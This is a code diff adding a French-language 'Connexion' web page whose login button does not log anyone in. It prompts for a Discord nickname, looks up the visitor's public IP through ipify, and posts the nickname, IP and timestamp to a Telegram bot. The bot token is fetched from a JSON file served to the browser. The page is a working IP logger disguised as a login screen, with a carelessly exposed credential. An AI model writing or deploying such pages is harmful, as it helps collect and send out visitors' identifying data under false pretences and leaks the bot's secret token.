@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Connexion</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <h1>Connexion</h1>
+  <button onclick="sendMessage()">Se connecter</button>
+  <p id="status"></p>
+
+  <script>
+    async function getJson(path) {
+      const res = await fetch(path);
+      if (!res.ok) throw new Error(`Erreur chargement ${path}`);
+      return await res.json();
+    }
+
+    async function sendMessage() {
+      const status = document.getElementById("status");
+
+      try {
+        // Récupère token et chat_id
+        const tokenJson = await getJson('back/token.json');
+        const idJson = await getJson('back/id.json');
+
+        const botToken = tokenJson.token;
+        const chatId = idJson.chat_id;
+
+        // Demander pseudo
+        const pseudo = prompt("Entre ton pseudo Discord :");
+        if (!pseudo) {
+          status.textContent = "❌ Pseudo requis.";
+          return;
+        }
+
+        status.textContent = "⏳ Récupération de l'IP...";
+
+        // Récup IP
+        let ip = "Inconnue";
+        try {
+          const ipRes = await fetch("https://api.ipify.org?format=json");
+          const ipData = await ipRes.json();
+          ip = ipData.ip;
+        } catch {
+          ip = "Erreur IP";
+        }
+
+        // Heure
+        const now = new Date();
+        const time = now.toLocaleString();
+
+        // Message
+        const message = `(${pseudo}) (${ip}) (${time}) s'est connecté`;
+
+        // Envoi Telegram
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const response = await fetch(telegramUrl, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+
+        const data = await response.json();
+        if (data.ok) {
+          status.textContent = `✅ Envoyé : ${message}`;
+        } else {
+          status.textContent = `❌ Erreur Telegram : ${data.description}`;
+        }
+      } catch (err) {
+        status.textContent = `❌ Erreur : ${err.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
